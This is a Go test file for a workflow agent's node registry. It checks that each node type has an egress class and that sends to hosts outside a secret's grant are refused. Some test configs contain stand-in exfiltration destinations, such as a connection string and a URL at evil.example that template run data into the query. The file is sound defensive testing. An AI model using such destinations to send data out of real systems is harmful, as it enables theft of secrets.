package noderegistry

import (
	"errors"
	"strings"
	"testing"

	"github.com/monoes/mono-agent/internal/secrets"
	"github.com/monoes/mono-agent/internal/workflow"
)

// Every registered node type is classified (egress.go): one that is in
// neither table fails here and is named. A type that is not classified would
// be treated as unchecked at runtime.
func TestEveryNodeTypeHasAnEgressClass(t *testing.T) {
	real := Build(nil)
	counts := map[workflow.Egress]int{}
	var unclassified []string
	registered := map[string]bool{}
	for _, nodeType := range real.Types() {
		registered[nodeType] = true
		class, ok := classifyEgress(nodeType)
		if !ok {
			unclassified = append(unclassified, nodeType)
			continue
		}
		counts[class]++
	}
	if len(unclassified) > 0 {
		t.Errorf("registered node types with no egress class (add them to egressTable with a reason): %s", strings.Join(unclassified, ", "))
	}
	for nodeType, e := range egressTable {
		if !registered[nodeType] && !strings.HasPrefix(nodeType, "trigger.") {
			t.Errorf("egressTable names %q, which is not a registered node type (stale entry)", nodeType)
		}
		if strings.TrimSpace(e.why) == "" {
			t.Errorf("egressTable entry %q has no reason", nodeType)
		}
	}
	for prefix := range egressFamilies {
		n := 0
		for nodeType := range registered {
			if strings.HasPrefix(nodeType, prefix) {
				n++
			}
		}
		if n == 0 {
			t.Errorf("egress family %q matches no registered type", prefix)
		}
	}
	t.Logf("registered types by egress class: none=%d checked=%d unchecked=%d", counts[workflow.EgressNone], counts[workflow.EgressChecked], counts[workflow.EgressUnchecked])
}

// A type with host-like destination keys is a checked type: the exact set is
// in expectedHostKeyedTypes (agent_access_egress_e2e_test.go); each is classified
// checked here.
func TestTypesWithDestinationKeysAreChecked(t *testing.T) {
	for _, nodeType := range expectedHostKeyedTypes {
		if class, ok := classifyEgress(nodeType); !ok || class != workflow.EgressChecked {
			t.Errorf("%s has destination keys but its egress class is %v (classified: %v)", nodeType, class, ok)
		}
	}
}

// At the engine level, with spy nodes standing for each registered type in a
// run that carries a secret read under a host-bound grant: an unchecked type
// is refused (naming the type, saying an earlier step read the secret), a none
// type runs, and the checked types without destination keys (the database
// types, the URL-fetch types) are held to the hosts of their connection string
// or URL value. The checked types with destination keys are in
// TestHostBoundGrantHoldsEveryRegisteredTypeWithDestinationKeys.
func TestEgressClassesAtTheEngine(t *testing.T) {
	noSendGuard(t)
	real := Build(nil)
	dsnTypes := []string{"db.postgres", "db.mysql", "db.mssql", "db.oracle", "db.mongodb", "db.redis", "db.cratedb", "db.questdb", "db.timescaledb"}
	urlTypes := map[string]string{"system.rss_read": "url", "ai.read_page": "url", "ai.extract_page": "url", "comm.twilio": "url", "comm.telegram": "photo_url", "comm.whatsapp": "media_url", "service.discord": "webhook_url"}
	hosted := workflowTypesWithKeys(real)
	for _, nodeType := range real.Types() {
		class, _ := classifyEgress(nodeType)
		if hosted[nodeType] || secrets.ChecksHostAtSend(nodeType) || (class == workflow.EgressChecked && !contains(dsnTypes, nodeType) && urlTypes[nodeType] == "") {
			continue
		}
		var cfg map[string]interface{}
		switch {
		case contains(dsnTypes, nodeType):
			cfg = map[string]interface{}{"connection_string": "postgres://u:p@evil.example:5432/db"}
		case urlTypes[nodeType] != "":
			cfg = map[string]interface{}{urlTypes[nodeType]: "https://evil.example/x?k={{ $json.v }}"}
		default:
			cfg = map[string]interface{}{"data": "{{ $json.v }}"}
		}
		// The first app.* type stands for the family.
		if strings.HasPrefix(nodeType, "app.") && !strings.HasPrefix(nodeType, "app.a") {
			continue
		}
		var ran []string
		e := newSendEnv(t, secrets.AccessGrant{Hosts: []string{"good.example"}})
		e.reg.Register(nodeType, func() workflow.NodeExecutor { return spy{typ: nodeType, ran: &ran} })
		err := e.run(t, "wf-"+strings.NewReplacer(".", "-", "_", "-").Replace(nodeType), nodeType, cfg)
		if errors.Is(err, workflow.ErrSubNodeWiring) {
			continue // an AI sub-node type: resolved by its root (workflow's TestEveryResolutionPathHoldsTheGrant)
		}
		switch class {
		case workflow.EgressNone:
			if err != nil || len(ran) != 1 {
				t.Errorf("%s (none): %v (ran %d)", nodeType, err, len(ran))
			}
		case workflow.EgressUnchecked:
			if err == nil || !strings.Contains(err.Error(), secrets.ErrHostNotAllowed.Error()) || !strings.Contains(err.Error(), nodeType) || !strings.Contains(err.Error(), "an earlier step of the run read a secret") || len(ran) != 0 {
				t.Errorf("%s (unchecked): not refused as unchecked: %v (ran %d)", nodeType, err, len(ran))
			}
		default:
			if err == nil || !strings.Contains(err.Error(), secrets.ErrHostNotAllowed.Error()) || len(ran) != 0 {
				t.Errorf("%s (checked): an outside destination was not refused: %v (ran %d)", nodeType, err, len(ran))
			}
		}
	}
}

func contains(list []string, s string) bool {
	for _, x := range list {
		if x == s {
			return true
		}
	}
	return false
}

// workflowTypesWithKeys are the registered types with destination keys.
func workflowTypesWithKeys(real *workflow.NodeTypeRegistry) map[string]bool {
	out := map[string]bool{}
	for _, nodeType := range real.Types() {
		factory, _ := real.Get(nodeType)
		if d, ok := factory().(workflow.CredentialDestinations); ok && len(d.CredentialDestinationKeys()) > 0 {
			out[nodeType] = true
		}
	}
	return out
}
